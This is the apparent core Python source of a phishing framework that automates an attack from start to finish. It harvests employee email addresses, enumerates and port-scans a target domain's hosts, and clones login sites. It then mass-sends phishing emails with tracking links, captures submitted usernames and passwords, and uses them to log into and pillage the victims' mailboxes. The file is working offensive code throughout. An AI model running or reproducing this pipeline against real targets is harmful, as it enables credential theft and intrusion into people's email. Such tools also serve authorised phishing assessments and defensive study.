#import getopt
import argparse
import emails
import sys
import re
import os
import subprocess
import time
import signal
from collections import defaultdict

#import our libs
from emails import EmailTemplate
from utils import Utils
from display import Display
from gather import Gather
from mydns import Dns
from webprofiler import profiler
from mydb import MyDB
from sitecloner import SiteCloner
from mailpillager import MailPillager
import portscan

#import our modules
from modules.theharvester import theHarvester

#=================================================
# Primary CLASS
#=================================================

class Framework(object):

    def __init__(self):
        self.config = {}        # dict to contain combined list of config file options and commandline parameters
        self.email_list = []    # list of email targets
        self.hostname_list = []    # list of dns hosts
        self.server_list = {}
        self.profile_valid_web_templates = []
        self.profile_dynamic_web_templates = []
        self.pillaged_users = []
        self.bestMailServerPort = None
        self.bestMailServer = None
        self.webserver = None   # web server process
        self.webserverpid = None
        self.gather = None
        self.mp = None # mail pillager

        # initialize some config options
        self.config["domain_name"] = ""
        self.config["phishing_domain"] = ""
        self.config["company_name"] = ""
        self.config["config_filename"] = ""
        self.config["email_list_filename"] = ""

        # default all bool values to False
        self.config["verbose"] = False
        self.config["gather_emails"] = False
        self.config["gather_dns"] = False
        self.config["enable_externals"] = False
        self.config["enable_web"] = False
        self.config["enable_email"] = False
        self.config["enable_email_sending"] = False
        self.config["simulate_email_sending"] = False
        self.config["daemon_web"] = False
        self.config["always_yes"] = False
        self.config["enable_advanced"] = False
        self.config["profile_domain"] = False
        self.config["pillage_email"] = False

        # get current IP
        self.config['ip'] = Utils.getIP()

        # set a few misc values
        self.pid_path = os.path.dirname(os.path.realpath(__file__)) + "/../"
        self.display = Display()
        self.email_templates = defaultdict(list)

    #==================================================
    # SUPPORT METHODS
    #==================================================

    #----------------------------
    # CTRL-C display and exit
    #----------------------------
    def ctrlc(self):
        print
        self.display.alert("Ctrl-C caught!!!")
        self.cleanup()

    #----------------------------
    # Close everything down nicely
    #----------------------------
    def cleanup(self):
        print
        if (self.webserver is not None):
            if (self.config["daemon_web"]):
                self.display.alert("Webserver is still running as requested.")
            else:
                # send SIGTERM to the web process
                self.display.output("stopping the webserver")
                self.webserver.send_signal(signal.SIGINT)
                # delete the pid file
                os.remove(self.pid_path + "spfwebsrv.pid") 
                # as a double check, manually kill the process
                self.killProcess(self.webserverpid)
        # call report generation
        self.generateReport()
        # exit
        sys.exit(0)

    #----------------------------
    # Kill specified process
    #----------------------------
    def killProcess(self, pid):
        if (os.path.exists("/proc/" + str(pid))):
            self.display.alert("Killing process [%s]" % (pid))
            os.kill(pid, signal.SIGKILL)
            if (os.path.isfile(self.pid_path + "spfwebsrv.pid")):
                os.remove(self.pid_path + "spfwebsrv.pid") 

    #----------------------------
    # Generate The simple report
    #----------------------------
    def generateReport(self):
        self.display.output("Generating phishing report")
        self.display.log("ENDTIME=%s\n" % (time.strftime("%Y/%m/%d %H:%M:%S")), filename="INFO.txt")

        # Start process
        cmd = [os.getcwd() + "/report.py", self.logpath]
        self.display.output("Report file located at %s%s" % (self.logpath, subprocess.check_output(cmd)))

    #----------------------------
    # Parse CommandLine Parms
    #----------------------------
    def parse_parameters(self, argv):
        parser = argparse.ArgumentParser()

        #==================================================
        # Input Files
        #==================================================
        filesgroup = parser.add_argument_group('input files')
        filesgroup.add_argument("-f",
                            metavar="<list.txt>",
                            dest="email_list_file",
                            action='store',
                            help="file containing list of email addresses")
        filesgroup.add_argument("-C",
                            metavar="<config.txt>",
                            dest="config_file",
                            action='store',
                            help="config file")

        #==================================================
        # Enable Flags
        #==================================================
        enablegroup = parser.add_argument_group('enable flags')
        enablegroup.add_argument("--all",
                            dest="enable_all",
                            action='store_true',
                            help="enable ALL flags... same as (-g --external -s -w -v -v -y)")
        enablegroup.add_argument("--test",
                            dest="enable_test",
                            action='store_true',
                            help="enable all flags EXCEPT sending of emails... same as (-g --external --simulate -w -y -v -v)")
        enablegroup.add_argument("--recon",
                            dest="enable_recon",
                            action='store_true',
                            help="gather info (i.e. email addresses, dns hosts, websites, etc...) same as (-e --dns)")
        enablegroup.add_argument("--external",
                            dest="enable_external",
                            action='store_true',
                            help="enable external tool utilization")
        enablegroup.add_argument("--dns",
                            dest="enable_gather_dns",
                            action='store_true',
                            help="enable automated gathering of dns hosts")
        enablegroup.add_argument("-g",
                            dest="enable_gather_email",
                            action='store_true',
                            help="enable automated gathering of email targets")
        enablegroup.add_argument("-s",
                            dest="enable_send_email",
                            action='store_true',
                            help="enable automated sending of phishing emails to targets")
        enablegroup.add_argument("--simulate",
                            dest="simulate_send_email",
                            action='store_true',
                            help="simulate the sending of phishing emails to targets")
        enablegroup.add_argument("-w",
                            dest="enable_web",
                            action='store_true',
                            help="enable generation of phishing web sites")
        enablegroup.add_argument("-W",
                            dest="daemon_web",
                            action='store_true',
                            help="leave web server running after termination of spf.py")

        #==================================================
        # Advanced Flags
        #==================================================
        advgroup = parser.add_argument_group('ADVANCED')
        advgroup.add_argument("--adv",
                            dest="enable_advanced",
                            action='store_true',
                            help="perform all ADVANCED features same as (--dns --profile --pillage)")
        advgroup.add_argument("--profile",
                            dest="profile_domain",
                            action='store_true',
                            help="profile the target domain (requires the --dns flag)")
        advgroup.add_argument("--pillage",
                            dest="pillage_email",
                            action='store_true',
                            help="auto pillage email accounts (requires the --dns flag)")

        #==================================================
        # Optional Args
        #==================================================
        parser.add_argument("-d",
                            metavar="<domain>",
                            dest="domain",
                            action='store',
                            help="domain name to phish")
        parser.add_argument("-p",
                            metavar="<domain>",
                            dest="phishdomain",
                            default="example.com",
                            action='store',
                            help="newly registered 'phish' domain name")
        parser.add_argument("-c",
                            metavar="<company's name>",
                            dest="company",
                            action='store',
                            help="name of company to phish")
        parser.add_argument("--ip",
                            metavar="<IP address>",
                            dest="ip",
                            default=Utils.getIP(),
                            action='store',
                            help="IP of webserver defaults to [%s]" % (Utils.getIP()))
        parser.add_argument("-v", "--verbosity",
                            dest="verbose",
                            action='count',
                            help="increase output verbosity")

        #==================================================
        # Misc Flags
        #==================================================
        miscgroup = parser.add_argument_group('misc')
        miscgroup.add_argument("-y",
                            dest="always_yes",
                            action='store_true',
                            help="automatically answer yes to all questions")

        # parse args
        args = parser.parse_args()

        # convert parameters to values in the config dict
        self.config["domain_name"] = args.domain
        if (self.config["domain_name"] is None):
            self.config["domain_name"] = ""
        self.config["phishing_domain"] = args.phishdomain
        if (self.config["phishing_domain"] is None):
            self.config["phishing_domain"] = "example.com"
        self.config["company_name"] = args.company
        self.config["ip"] = args.ip
        self.config["config_filename"] = args.config_file
        self.config["email_list_filename"] = args.email_list_file
        self.config["verbose"] = args.verbose
        self.config["gather_emails"] = args.enable_gather_email
        self.config["gather_dns"] = args.enable_gather_dns
        self.config["profile_domain"] = args.profile_domain
        self.config["pillage_email"] = args.pillage_email
        self.config["enable_externals"] = args.enable_external
        self.config["enable_web"] = args.enable_web
        self.config["enable_email_sending"] = args.enable_send_email
        self.config["simulate_email_sending"] = args.simulate_send_email
        self.config["daemon_web"] = args.daemon_web
        self.config["always_yes"] = args.always_yes

        # process meta flags
        
        # recon = gather emails and gather dns
        if (args.enable_recon == True):
            self.config["gather_emails"] =  True
            self.config["gather_dns"] = True

        # all = gather emails, enable externals, etc...
        if (args.enable_all == True):
            self.config["gather_emails"] =  True
            self.config["enable_externals"] = True
            self.config["enable_web"] = True
            self.config["enable_email_sending"] = True
            self.config["verbose"] = 2
            self.config["always_yes"] = True

        # test = gather emails, enable externals, etc...
        if (args.enable_test == True):
            self.config["gather_emails"] = True
            self.config["enable_externals"] = True
            self.config["simulate_email_sending"] = True
            self.config["enable_web"] = True
            self.config["always_yes"] = True
            self.config["verbose"] = 2

        # advanced = dns, profile, and pillage
        if (args.enable_advanced == True):
            self.config["gather_dns"] = True
            self.config["profile_domain"] = True
            self.config["pillage_email"] = True

        # profile requires dns
        if (self.config["profile_domain"] and not self.config["gather_dns"]):
            self.config["profile_domain"] = False
            self.display.error("--profile requires the --dns option to be enabled as well.")

        # pillage requires dns
        if (self.config["pillage_email"] and not self.config["gather_dns"]):
            self.config["pillage_email"] = False
            self.display.error("--pillage requires the --dns option to be enabled as well.")

        # see if we are good to go
        good = False
        if (self.config["email_list_filename"]
                or self.config["gather_emails"]
                or self.config["enable_externals"]
                or self.config["enable_web"]
                or self.config["enable_email_sending"]
                or self.config["simulate_email_sending"]
                or self.config["gather_dns"]
                or self.config["profile_domain"]
                or self.config["pillage_email"]):
            good = True
        if (not good):
            self.display.error("Please enable at least one of the following parameters: -g --external --dns -s --simulate -w ( --all --test --recon --adv )")
            print
            parser.print_help()
            sys.exit(1)

    #----------------------------
    # Process/Load config file
    #----------------------------
    def load_config(self):
        # does config file exist?
        if (self.config["config_filename"] is not None):
            temp1 = self.config
            temp2 = Utils.load_config(self.config["config_filename"])
            self.config = dict(temp2.items() + temp1.items())
        else:
            # guess not..   so try to load the default one
            if Utils.is_readable("default.cfg"):
                self.display.error("a CONFIG FILE was not specified...  defaulting to [default.cfg]")
                print
                temp1 = self.config
                temp2 = Utils.load_config("default.cfg")
                self.config = dict(temp2.items() + temp1.items())
            else:
                # someone must have removed it!
                self.display.error("a CONFIG FILE was not specified...")
                print
                sys.exit(1)

        # set verbosity/debug level
        if (self.config['verbose'] >= 1):
            self.display.enableVerbose()
        if (self.config['verbose'] > 1):
            self.display.enableDebug()

        # set logging path
        self.logpath = os.getcwd() + "/" + self.config["domain_name"] + "_" + self.config["phishing_domain"] + "/"
        if not os.path.exists(os.path.dirname(self.logpath)):
            os.makedirs(os.path.dirname(self.logpath))
        self.display.setLogPath(self.logpath)

        # create sqllite db
        self.db = MyDB(sqlite_file=self.logpath)

        # log it
        self.display.log("STARTTIME=%s\n" % (time.strftime("%Y/%m/%d %H:%M:%S")), filename="INFO.txt")
        self.display.log("TARGETDOMAIN=%s\n" % (self.config["domain_name"]), filename="INFO.txt")
        self.display.log("PHISHINGDOMAIN=%s\n" % (self.config["phishing_domain"]), filename="INFO.txt")

    #----------------------------
    # Load/Gather target email addresses
    #----------------------------
    def prep_email(self):
        # are required flags set?
        if ((self.config["email_list_filename"] is not None) or (self.config["gather_emails"] == True)):
            print
            self.display.output("Obtaining list of email targets")
            if (self.config["always_yes"] or self.display.yn("Continue", default="y")):

                # if an external email list file was specified, read it in
                if self.config["email_list_filename"] is not None:
                    file = open(self.config["email_list_filename"], 'r')
                    temp_list = file.read().splitlines()
                    self.display.verbose("Loaded [%s] email addresses from [%s]" % (len(temp_list), self.config["email_list_filename"]))
                    self.email_list += temp_list

                # gather email addresses
                if self.config["gather_emails"] == True:
                    if (self.config["domain_name"] == ""):
                        self.display.error("No target domain specified.  Can not gather email addresses.")
                    else:
                        self.display.verbose("Gathering emails via built-in methods")
                        self.display.verbose(Gather.get_sources())
                        if (not self.gather):
                            self.gather = Gather(self.config["domain_name"], display=self.display)
                        temp_list = self.gather.emails()
                        self.display.verbose("Gathered [%s] email addresses from the Internet" % (len(temp_list)))
                        self.email_list += temp_list
                        print

                        # gather email addresses from external sources
                        if (self.config["gather_emails"] == True) and (self.config["enable_externals"] == True):
                            # theHarvester
                            self.display.verbose("Gathering emails via theHarvester")
                            thr = theHarvester(self.config["domain_name"], self.config["theharvester_path"], display=self.display)
                            out = thr.run()
                            if (not out):
                                temp_list = thr.emails()
                                self.display.verbose("Gathered [%s] email addresses from theHarvester" % (len(temp_list)))
                                self.email_list += temp_list
                            else:
                                self.display.error(out)
                            print

    #                        # Recon-NG
    #                        self.display.verbose("Gathering emails via Recon-NG")
    #                        temp_list = reconng(self.config["domain_name"], self.config["reconng_path"]).gather()
    #                        self.display.verbose("Gathered [%s] email addresses from Recon-NG" % (len(temp_list)))
    #                        self.email_list += temp_list

                # sort/unique email list
                self.email_list = Utils.unique_list(self.email_list)
                self.email_list.sort()

                # add each user to the sqllite db
                self.db.addUsers(self.email_list)

                # print list of email addresses
                self.display.verbose("Collected [%s] unique email addresses" % (len(self.email_list)))
                self.display.print_list("EMAIL LIST",self.email_list)
                for email in self.email_list:
                    self.display.log(email + "\n", filename="email_targets.txt")

    #----------------------------
    # Gather dns hosts
    #----------------------------
    def gather_dns(self):
        # are required flags set?
        if (self.config["gather_dns"] == True):
            print
            self.display.output("Obtaining list of host on the %s domain" % (self.config["domain_name"]))
            self.display.verbose("Gathering hosts via built-in methods")

            # Gather hosts from internet search
            self.display.verbose(Gather.get_sources())
            if (not self.gather):
                self.gather = Gather(self.config["domain_name"], display=self.display)
            temp_list = self.gather.hosts()
            self.display.verbose("Gathered [%s] hosts from the Internet Search" % (len(temp_list)))
            self.hostname_list += temp_list

            # Gather hosts from DNS lookups
            temp_list = Dns.xfr(self.config["domain_name"])
            self.display.verbose("Gathered [%s] hosts from DNS Zone Transfer" % (len(temp_list)))
            self.hostname_list += temp_list

            temp_list = Dns.ns(self.config["domain_name"])
            temp_list = Utils.filterList(temp_list, self.config["domain_name"])
            self.display.verbose("Gathered [%s] hosts from DNS NS lookups" % (len(temp_list)))
            self.hostname_list += temp_list

            temp_list = Dns.mx(self.config["domain_name"])
            temp_list = Utils.filterList(temp_list, self.config["domain_name"])
            self.display.verbose("Gathered [%s] hosts from DNS MX lookups" % (len(temp_list)))
            self.hostname_list += temp_list

            # Gather hosts from dictionary lookup
            try:
                temp_list = Dns.brute(self.config["domain_name"], display=self.display)
            except:
                pass
            self.display.verbose("Gathered [%s] hosts from DNS BruteForce/Dictionay Lookup" % (len(temp_list)))
            self.hostname_list += temp_list

            # sort/unique hostname list
            self.hostname_list = Utils.unique_list(self.hostname_list)
            self.hostname_list.sort()

            # add list of identified hosts to sqllite db
            self.db.addHosts(self.hostname_list)

            # print list of hostnames
            self.display.verbose("Collected [%s] unique host names" % (len(self.hostname_list)))
            self.display.print_list("HOST LIST", self.hostname_list)

    #----------------------------
    # Perform Port Scans
    #----------------------------
    def port_scan(self):
        # are required flags set?
        if (self.config["gather_dns"] == True):
            self.display.output("Performing basic port scans of any identified hosts.")

            # define list of ports to scan for
            ports = [25, 80,110, 143, 443, 993, 995]
 
            # prep array of arrays
            for port in ports:
                self.server_list[port] = []

            # for each host in the host list
            for host in self.hostname_list:
                # run port scan
                openports = portscan.scan(host, ports)
                found = False
                
                # for any open ports, add it to the associated list
                for port in openports:
                    self.db.addPort(port, host)
                    if (port == 80):
                        self.display.verbose("Found website at: %s 80" % (host))
                        self.server_list[80].append(host)
                        found = True
                    elif (port == 443):
                        self.display.verbose("Found website at: %s 443" % (host))
                        self.server_list[443].append(host)
                        found = True
                    elif (port == 110):
                        self.display.verbose("Found POP at    : %s 110" % (host))
                        self.server_list[110].append(host)
                        found = True
                    elif (port == 995):
                        self.display.verbose("Found POPS at   : %s 995" % (host))
                        self.server_list[995].append(host)
                        found = True
                    elif (port == 143):
                        self.display.verbose("Found IMAP at   : %s 143" % (host))
                        self.server_list[143].append(host)
                        found = True
                    elif (port == 993):
                        self.display.verbose("Found IMAPS at  : %s 993" % (host))
                        self.server_list[993].append(host)
                        found = True
                    elif (port == 25):
                        self.display.verbose("Found SMTP at   : %s 25" % (host))
                        self.server_list[25].append(host)
                        found = True
                    if (found):
                        self.display.log(host + "\n", filename="hosts.txt")

    #----------------------------
    # Profile Web Sites
    #----------------------------
    def profile_site(self):
        # are required flags set?
        if (self.config["profile_domain"] == True):
            self.display.output("Determining if any of the identified hosts have web servers.")

            # for hosts in the port 80 list
            for host in self.server_list[80]:
                # create a profiler object
                p = profiler()
                # run it against the website
                profile_results = p.run("http://" + host, debug=False)
                # if we got valid results, look to see if we have a match for one of the templates
                if (profile_results and (len(profile_results) > 0)):
                    max_key = ""
                    max_value = 0
                    for key, value in profile_results:
                        if (value.getscore() > max_value):
                            max_key = key
                            max_value = value.getscore()
                    if (max_value > 0):
                        self.display.verbose("POSSIBLE MATCH FOR [http://%s] => [%s]" % (host, max_key))
                        self.profile_valid_web_templates.append(max_key)
                else:
                    # other wise we will see about adding it to a list of sites to clone
                    if (p.hasLogin("http://" + host)):
                        self.profile_dynamic_web_templates.append("http://" + host)

            # repeat same as for port 80
            for host in self.server_list[443]:
                p = profiler()
                profile_results = p.run("https://" + host, debug=False)
                if (profile_results and (len(profile_results) > 0)):
                    max_key = ""
                    max_value = 0
                    for key, value in profile_results:
                        if (value.getscore() > max_value):
                            max_key = key
                            max_value = value.getscore()
                    if (max_value > 0):
                        self.display.verbose("POSSIBLE MATCH FOR [https://%s] => [%s]" % (host, max_key))
                        self.profile_valid_web_templates.append(max_key)
                else:
                    if (p.hasLogin("https://" + host)):
                        self.display.verbose("POSSIBLE DYNAMIC TEMPLATE SITE [https://%s]" % (host))
                        self.profile_dynamic_web_templates.append("https://" + host)

            # sort/unique list of valid templates
            self.profile_valid_web_templates = Utils.unique_list(self.profile_valid_web_templates)
            self.profile_valid_web_templates.sort()
            # print list of valid templatess
            self.display.verbose("Collected [%s] valid web templates" % (len(self.profile_valid_web_templates)))
            self.display.print_list("VALID TEMPLATE LIST",self.profile_valid_web_templates)

            # sort/unique list of dynamic templates
            self.profile_dynamic_web_templates = Utils.unique_list(self.profile_dynamic_web_templates)
            self.profile_dynamic_web_templates.sort()

            # print list of valid templatess
            self.display.verbose("Collected [%s] dynamic web templates" % (len(self.profile_dynamic_web_templates)))
            self.display.print_list("DYNAMIC TEMPLATE LIST",self.profile_dynamic_web_templates)

            # for any dynamic sites, try to clone them
            self.display.output("Cloning any DYNAMIC sites")
            for template in self.profile_dynamic_web_templates:
                sc = SiteCloner(clone_dir=self.logpath)
                tdir = sc.cloneUrl(template)
                self.display.verbose("Cloning [%s] to [%s]" % (template, tdir))
                self.db.addWebTemplate(ttype="dynamic", src_url=template, tdir=tdir)

            # loop over all built in templates
            for f in os.listdir(self.config["web_template_path"]):
                template_file = os.path.join(self.config["web_template_path"], f) + "/CONFIG"
                for line in open(template_file).readlines():
                    for tem in self.profile_valid_web_templates:
                        if re.match("^VHOST=\s*"+tem+"\s*$", line, re.IGNORECASE):
                            self.db.addWebTemplate(ttype="static", src_url="", tdir=os.path.join(self.config["web_template_path"], f))
                            break

    #----------------------------
    # Load web sites
    #----------------------------
    def load_websites(self):
        # are required flags set?
        if self.config["enable_web"] == True:
            print
            self.display.output("Starting phishing webserver")
            if (self.config["always_yes"] or self.display.yn("Continue", default="y")):

                path = os.path.dirname(os.path.realpath(__file__))
                # Start process
                cmd = [path + "/../web.py", Utils.compressDict(self.config)]
                self.webserver = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE)

                # monitor output to gather website information
                while True:
                    line = self.webserver.stdout.readline()
                    line = line.strip()
                    if line == 'Websites loaded and launched.':
                        break
                    if line != '':
                        self.display.verbose(line)
                        match=re.search("Started website", line)
                        VHOST = ""
                        PORT = ""
                        if match:
                            parts=line.split("[")
                            VHOST=parts[1].split("]")
                            VHOST=VHOST[0].strip()
                            PORT=parts[2].split("]")
                            PORT=PORT[0].strip()
                            PORT=PORT[7:]
                            # keep the URL clean
                            # if port is 80, then it does not need to be included in the URL
                            if (PORT[-3:] == ":80"):
                                PORT = PORT[:-3]

                            self.config[VHOST + "_port"] = PORT
                            self.config[VHOST + "_vhost"] = VHOST
                            Utils.screenCaptureWebSite("http://" + PORT,
                                self.logpath + PORT + "_" + VHOST + ".png")
                            Utils.screenCaptureWebSite("http://" + VHOST + "." + self.config["phishing_domain"],
                                self.logpath + VHOST + "." + self.config["phishing_domain"] + ".png")

                # Write PID file
                pidfilename = os.path.join(self.pid_path, "spfwebsrv.pid")
                pidfile = open(pidfilename, 'w')
                pidfile.write(str(self.webserver.pid))
                pidfile.close()
                self.webserverpid = self.webserver.pid
                self.display.verbose("Started WebServer with pid = [%s]" % self.webserver.pid)

    #----------------------------
    # Build array of email templates
    #----------------------------
    def load_email_templates(self):
        # do we even have targets?
        if (((self.email_list is not None)
            and (self.email_list))
                and ((self.config["enable_email_sending"] == True)
                    or (self.config["simulate_email_sending"] == True))):
            print
            self.display.verbose("Locating phishing email templates")
            if (self.config["always_yes"] or self.display.yn("Continue", default="y")):

                # loop over each email template
                for f in os.listdir("templates/email/"):
                    template_file = os.path.join("templates/email/", f)
                    self.display.debug("Found the following email template: [%s]" % template_file)

                    if ((Utils.is_readable(template_file)) and (os.path.isfile(template_file))):
                        # read in the template SUBJECT, TYPE, and BODY
                        TYPE = ""
                        SUBJECT = ""
                        BODY = ""
                        with open (template_file, "r") as myfile:
                            for line in myfile.readlines():
                                match=re.search("TYPE=", line)
                                if match:
                                    TYPE=line.replace('"', "")
                                    TYPE=TYPE.split("=")
                                    TYPE=TYPE[1].lower().strip()
                                match2=re.search("SUBJECT=", line)
                                if match2:
                                    SUBJECT=line.replace('"', "")
                                    SUBJECT=SUBJECT.split("=")
                                    SUBJECT=SUBJECT[1].strip()
                                match3=re.search("BODY=", line)
                                if match3:
                                    BODY=line.replace('"', "")
                                    BODY=BODY.replace(r'\n', "\n")
                                    BODY=BODY.split("=")
                                    BODY=BODY[1].strip()
                        self.email_templates[TYPE].append(EmailTemplate(TYPE, SUBJECT, BODY))

    #----------------------------
    # Generate/Send phishing emails
    #----------------------------
    def send_emails(self):
        # are required flags set?
        if ((self.config["enable_email_sending"] == True) or (self.config["simulate_email_sending"] == True)):
            if ((self.config["determine_smtp"] == "1") and (self.config["use_specific_smtp"] == "1")):
               self.display.error("ONLY 1 of DETERMINE_SMTP or USE_SPECIFIC_SMTP can be enabled at a time.")
            else:
                print
                self.display.output("Sending phishing emails")
                if (self.config["always_yes"] or self.display.yn("Continue", default="y")):

                    templates_logged = []
                    #do we have any emails top send?
                    if self.email_list:
                        temp_target_list = self.email_list
                        temp_delay = 1
                        if (self.config["email_delay"] is not None):
                            temp_delay = int(self.config["email_delay"])
                        send_count = 0
                        # while there are still target email address, loop
                        while (temp_target_list and (send_count < (int(self.config["emails_max"])))):
                            # inc number of emails we have attempted to send
                            send_count = send_count + 1
                            # delay requested amount of time between sending emails
                            time.sleep(temp_delay)
                            # for each type of email (citrix, owa, office365, ...)
                            for key in self.email_templates:
                                # double check
                                if temp_target_list:
                                    # for each email template of the given type
                                    for template in self.email_templates[key]:
                                        # double check
                                        if temp_target_list:
                                            # grab a new target email address
                                            target = temp_target_list.pop(0)
                                            self.display.verbose("Sending Email to [%s]" % target)
                                            #FROM = "support@" + self.config["phishing_domain"]
                                            FROM = self.config["smtp_fromaddr"]

                                            SUBJECT = template.getSUBJECT()
                                            BODY = template.getBODY()

                                            # perform necessary SEARCH/REPLACE 
                                            if self.config["enable_host_based_vhosts"] == "1":
                                                targetlink="http://" + key + "." + self.config["phishing_domain"]
                                                if self.config["enable_user_tracking"] == "1":
                                                    targetlink += "?u=" + self.db.getUserTrackId(target)
                                                BODY=BODY.replace(r'[[TARGET]]', targetlink)
                                            else:
                                                if (not key == "dynamic"):
                                                    targetlink="http://" + self.config[key+ "_port"]
                                                    if self.config["enable_user_tracking"] == "1":
                                                        targetlink += "?u=" + self.db.getUserTrackId(target)
                                                    BODY=BODY.replace(r'[[TARGET]]', targetlink)

                                            # log
                                            if (key not in templates_logged):
                                                self.display.log("----------------------------------------------\n\n" +
                                                                 "TO: <XXXXX>\n" +
                                                                 "FROM: " + FROM + "\n" +
                                                                 "SUBJECT: " + SUBJECT + "\n\n" +
                                                                 BODY + "\n\n" + 
                                                                 "----------------------------------------------\n\n" +
                                                                 "TARGETS:\n" +
                                                                 "--------\n",
                                                                 filename="email_template_" + key + ".txt")
                                                templates_logged.append(key)
                                            self.display.log(target + "\n", filename="email_template_" + key + ".txt")

                                            # send the email
                                            if (self.config["simulate_email_sending"] == True):
                                                self.display.output("Would have sent an email to [%s] with subject of [%s], but this was just a test." % (target, SUBJECT))
                                            else:
                                                try:
                                                    if self.config["determine_smtp"] == "1":
                                                        emails.send_email_direct(target,
                                                                FROM,
                                                                self.config["smtp_displayname"],
                                                                SUBJECT,
                                                                BODY,
                                                                debug=True)
                                                    if self.config["use_specific_smtp"] == "1":
                                                        print self.config["smtp_fromaddr"]
                                                        emails.send_email_account(self.config["smtp_server"],
                                                                int(self.config["smtp_port"]),
                                                                self.config["smtp_user"],
                                                                self.config["smtp_pass"],
                                                                target,
                                                                self.config["smtp_fromaddr"],
                                                                self.config["smtp_displayname"],
                                                                SUBJECT,
                                                                BODY,
                                                                debug=True)
                                                except:
                                                    self.display.error("Count not send email to " + target)


    #----------------------------
    # Monitor web sites
    #----------------------------
    def monitor_results(self):
        # are required flags set?
        if self.config["enable_web"] == True:
            print
            self.display.output("Monitoring phishing website activity!")
            self.display.alert("(Press CTRL-C to stop collection and generate report!)")
            if (self.webserver):
                while True:
                    line = self.webserver.stdout.readline()
                    line = line.strip()
                    if (self.config["pillage_email"]):
                        self.pillage(line)
                    self.display.output(line)

    #==================================================
    # Secondary METHODS
    #==================================================

    #----------------------------
    # Pillage Emails
    #----------------------------
    def pillage(self, line):
        username = None
        password = None

        # parse line into username/password
        usermatch = re.match(".*username=\['(.*?)'\].*", line)
        if (usermatch):
            username = usermatch.group(1)
        passmatch = re.match(".*password=\['(.*?)'\].*", line)
        if (passmatch):
            password = passmatch.group(1)

        # if no username or password, then return
        if ((not username) or (not password)):
            return

        # is it a new username/password pair we have not seen before?
        if (not username+":"+password in self.pillaged_users):
            self.pillaged_users.append(username+":"+password)

            # make a new MailPillager if one does not exist
            if (not self.mp):
                self.mp = MailPillager()

            # attempt to determine the best Mail Server to use
            if (not self.bestMailServer):
                self.determineBestMailServer()

            # if no Best Mail Server was identified, return
            if (not self.bestMailServer):
                self.display.error("No valid target IMAP/POP3 mail servers were identified.")
                return

            #print self.bestMailServer + ":" + str(self.bestMailServerPort)

            # PILLAGE!!!
            self.mp.pillage(username=username, password=password, server=self.bestMailServer,
                    port=self.bestMailServerPort, domain=self.config["domain_name"], outputdir=self.logpath)

    #----------------------------
    # See which Mail Server we should use
    #
    # TODO: needs to be updated!!!
    #----------------------------
    def determineBestMailServer(self):
        if self.server_list[993]: # IMAPS
            self.bestMailServerPort = 993
            self.bestMailServer = self.server_list[993][0]
        elif self.server_list[143]: #IMAP
            self.bestMailServerPort = 143
            self.bestMailServer = self.server_list[143][0]
        elif self.server_list[995]: # POP3S
            self.bestMailServerPort = 995
            self.bestMailServer = self.server_list[995][0]
        elif self.server_list[110]: # POP3
            self.bestMailServerPort = 110
            self.bestMailServer = self.server_list[110][0]

    #==========================================================================================
    #==========================================================================================
    #==========================================================================================

    #----------------------------
    # Primary METHOD
    #----------------------------
    def run(self, argv):
        # load config
        self.parse_parameters(argv)
        self.load_config()
        
        # dns/portscan/cloning
        self.gather_dns()
        self.port_scan()
        self.profile_site()

        # load websites 
        self.load_websites()

        # do email stuff
        self.prep_email()
        self.load_email_templates()
        self.send_emails()

        # sit back and listen
        self.monitor_results()
